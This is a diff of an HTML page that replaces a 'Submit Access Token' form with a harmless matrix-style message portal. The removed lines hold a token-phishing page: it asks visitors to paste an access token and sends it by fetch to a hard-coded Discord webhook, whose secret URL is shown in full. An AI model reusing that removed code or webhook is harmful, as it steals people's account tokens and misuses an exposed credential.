@@ -1,95 +1,85 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Submit Access</title>
+<title>Neon Message Portal</title>
 
 <style>
 
 body{
 margin:0;
+background:black;
+font-family:monospace;
+color:#00ff99;
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-font-family:Arial;
-background:linear-gradient(black,#1a1a1a,#ffffff);
+overflow:hidden;
 }
 
-/* Glow background effect */
+/* MATRIX CANVAS */
 
-body::before{
-content:"";
-position:absolute;
-width:500px;
-height:500px;
-background:radial-gradient(circle, rgba(255,255,255,0.4), transparent);
-filter:blur(120px);
-animation:glowMove 8s infinite alternate;
+canvas{
+position:fixed;
+top:0;
+left:0;
+z-index:-1;
 }
 
-@keyframes glowMove{
-0%{transform:translate(-200px,-100px);}
-100%{transform:translate(200px,100px);}
-}
-
-/* Glass card */
+/* MAIN BOX */
 
 .container{
-position:relative;
-background:rgba(255,255,255,0.08);
-backdrop-filter:blur(15px);
-padding:40px;
-border-radius:15px;
 text-align:center;
-box-shadow:0 0 40px rgba(255,255,255,0.3);
-}
-
-/* Images */
-
-.images img{
-width:120px;
+background:rgba(0,0,0,0.7);
+padding:40px;
 border-radius:10px;
-margin:5px;
-box-shadow:0 0 20px rgba(255,255,255,0.6);
+border:1px solid #00ff99;
+box-shadow:0 0 20px #00ff99;
 }
 
-/* Title */
+/* TITLE */
 
 h1{
-color:white;
+text-shadow:0 0 10px #00ff99,0 0 20px #00ff99;
 margin-bottom:20px;
-text-shadow:0 0 15px white;
 }
 
-/* Input */
+/* INPUT */
 
 input{
 padding:12px;
 width:260px;
 border:none;
-border-radius:8px;
+border-radius:5px;
 outline:none;
 margin-bottom:20px;
 }
 
-/* Glowing button */
+/* BUTTON */
 
 button{
 padding:12px 30px;
 border:none;
 border-radius:30px;
-background:black;
-color:white;
+background:#00ff99;
+color:black;
 font-weight:bold;
 cursor:pointer;
-box-shadow:0 0 10px white,0 0 30px white;
 transition:0.3s;
 }
 
 button:hover{
-transform:scale(1.1);
-box-shadow:0 0 20px white,0 0 50px white;
+transform:scale(1.15);
+box-shadow:0 0 15px #00ff99,0 0 40px #00ff99;
+}
+
+/* MESSAGE TEXT */
+
+#output{
+margin-top:20px;
+font-size:18px;
+text-shadow:0 0 10px #00ff99;
 }
 
 </style>
@@ -97,46 +87,75 @@ box-shadow:0 0 20px white,0 0 50px white;
 
 <body>
 
+<canvas id="matrix"></canvas>
+
 <div class="container">
 
-<div class="images">
-<img src="https://i.imgur.com/Fr0czWg.jpeg">
-<img src="https://i.imgur.com/ulSLhDy.jpeg">
-</div>
+<h1>NEON MESSAGE PORTAL</h1>
 
-<h1>Submit Access Token</h1>
-
-<input id="messageInput" placeholder="Paste here">
+<input id="msg" placeholder="Type your message">
 
 <br>
 
-<button onclick="sendMessage()">Submit</button>
+<button onclick="sendMessage()">Send Message</button>
+
+<div id="output"></div>
 
 </div>
 
 <script>
 
+/* BUTTON ACTION */
+
 function sendMessage(){
+const text=document.getElementById("msg").value;
+document.getElementById("output").innerText="Message Sent: " + text;
+}
 
-const message=document.getElementById("messageInput").value;
+/* MATRIX EFFECT */
 
-const webhook="https://discord.com/api/webhooks/1450681251655581726/uZOSEpFUt-2x9uBZvBelHt4wPWuO9XNvBTj4VW4HfEiVVWvFORankW-2pDFDwXexqF61";
+const canvas=document.getElementById("matrix");
+const ctx=canvas.getContext("2d");
 
-fetch(webhook,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-content:"New message: "+message
-})
-});
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
 
-alert("Submitted!");
+const letters="01";
+const fontSize=16;
+const columns=canvas.width/fontSize;
+
+const drops=[];
+
+for(let i=0;i<columns;i++){
+drops[i]=1;
+}
+
+function draw(){
+
+ctx.fillStyle="rgba(0,0,0,0.05)";
+ctx.fillRect(0,0,canvas.width,canvas.height);
+
+ctx.fillStyle="#0f0";
+ctx.font=fontSize+"px monospace";
+
+for(let i=0;i<drops.length;i++){
+
+const text=letters.charAt(Math.floor(Math.random()*letters.length));
+
+ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+
+if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
+drops[i]=0;
+}
+
+drops[i]++;
+}
 
 }
+
+setInterval(draw,33);
 
 </script>
 
 </body>
-</html>
+  </html>
